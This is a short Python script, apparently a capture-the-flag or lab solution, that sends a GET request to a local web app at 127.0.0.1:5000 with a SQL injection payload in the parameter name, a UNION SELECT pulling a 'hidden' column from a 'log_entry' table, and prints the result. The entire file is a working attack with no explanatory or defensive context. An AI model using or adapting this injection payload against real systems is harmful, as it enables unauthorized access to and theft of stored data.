#!/usr/bin/env python3

import requests 

domain = "127.0.0.1:5000"
url = "http://{domain}/".format(domain=domain)

r = requests.get(url, params={
    "FALSE UNION SELECT 1, hidden,'', '' FROM log_entry WHERE 1=1 OR 'x'" : "one"
    })

print(r.text)
